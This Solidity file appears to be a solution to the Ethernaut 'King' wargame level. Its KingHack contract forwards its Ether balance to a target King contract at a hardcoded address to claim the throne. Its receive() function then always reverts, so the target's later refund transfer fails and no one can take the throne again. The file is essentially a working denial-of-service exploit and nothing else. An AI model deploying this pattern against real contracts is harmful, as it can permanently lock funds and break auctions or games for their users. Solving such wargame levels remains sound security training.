// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./contract.sol";

contract KingHack {
    King public king =
        King(payable(0x6C0Db7C766573D1dcE5D6057d3b9Db3B6356D915));

    // Create a malicious contract and seed it with some Ethers
    function BadKing() public payable {}

    // This should trigger King fallback(), making this contract the king
    function becomeKing() public {
        // payable(address(0x6C0Db7C766573D1dcE5D6057d3b9Db3B6356D915)).transfer(
        //     address(this).balance
        // );
        (bool success, ) = address(king).call{value: address(this).balance}("");
        require(success);
    }

    // This function fails "king.transfer" trx from Ethernaut
    receive() external payable {
        revert("haha you fail");
    }
}
